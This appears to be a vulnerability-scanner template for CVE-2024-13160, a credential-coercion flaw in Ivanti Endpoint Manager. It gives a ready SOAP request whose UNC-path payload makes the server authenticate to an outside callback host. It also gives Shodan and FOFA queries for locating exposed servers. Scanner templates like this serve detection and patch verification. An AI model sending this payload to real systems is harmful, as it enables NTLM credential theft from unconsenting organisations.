http:
- matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, "dns")
    - contains(body, "<GetHashForWildcardResponse")
    - contains(content_type, "text/xml")
    - status_code == 200
    type: dsl
  raw:
  - "POST /WSVulnerabilityCore/VulCore.asmx HTTP/1.1\nHost: {{Hostname}}\nAccept:\
    \ */*\nContent-Type: text/xml\nSoapaction: http://tempuri.org/GetHashForWildcard\n\
    \n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    >\n    <soap:Body>\n        <GetHashForWildcard xmlns=\"http://tempuri.org/\"\
    >\n            <wildcard>\\\\{{interactsh-url}}\\tmp\\{{file}}.txt</wildcard>\n\
    \        </GetHashForWildcard>\n    </soap:Body>\n</soap:Envelope>\n"
id: CVE-2024-13160
info:
  author: ritikchaddha
  classification:
    cve-id: CVE-2024-13160
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-36
    epss-percentile: 0.9968
    epss-score: 0.91971
  description: 'A vulnerability in Ivanti Endpoint Manager (EPM) allows an unauthenticated
    attacker to coerce the EPM machine account credential via the GetHashForWildcard
    endpoint. The vulnerability exists due to improper input validation in the wildcard
    parameter, allowing an attacker to specify a remote UNC path that triggers NTLM
    authentication.

    '
  impact: 'Unauthenticated attackers can coerce NTLM authentication from the EPM server
    via UNC paths, allowing credential theft through man-in-the-middle attacks.

    '
  metadata:
    fofa-query: icon_hash="362091310"
    max-request: 1
    shodan-query: http.favicon.hash:362091310
  name: Ivanti EPM - Credential Coercion Vulnerability in GetHashForWildcard
  reference:
  - https://www.horizon3.ai/attack-research/attack-blogs/ivanti-endpoint-manager-multiple-credential-coercion-vulnerabilities/
  - https://nvd.nist.gov/vuln/detail/CVE-2024-13160
  remediation: 'Update Ivanti Endpoint Manager (EPM) to a patched version that addresses
    CVE-2024-13160.

    '
  severity: critical
  tags: cve,cve2024,ivanti,epm,ntlm,traversal,kev,vkev,vuln
variables:
  file: '{{to_lower(rand_text_alpha(5))}}'
